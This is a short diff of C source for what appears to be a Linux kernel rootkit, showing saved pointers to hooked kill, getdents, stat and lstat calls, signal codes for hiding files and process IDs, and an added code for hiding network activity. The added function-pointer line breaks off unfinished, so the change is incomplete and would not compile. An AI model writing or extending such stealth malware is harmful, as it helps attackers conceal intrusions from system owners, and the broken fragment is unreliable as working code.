@@ -27,6 +27,7 @@
 #define SIG_HIDE 33
 #define SIG_UNHIDE 34
 #define SIG_HIDEPID 35
+#define SIG_HIDE_NETWORK 36
 
 // this is the filename we want to hide
 // used in hacked_getdents(...)
@@ -38,6 +39,7 @@ asmlinkage int (*original_kill)(pid_t, int);
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 asmlinkage int (*original_stat)(const char *path, struct stat *buf);
 asmlinkage int (*original_lstat)(const char *path, struct stat *buf);
+asmlinkage int 
 
 struct list_head *module_list;
 
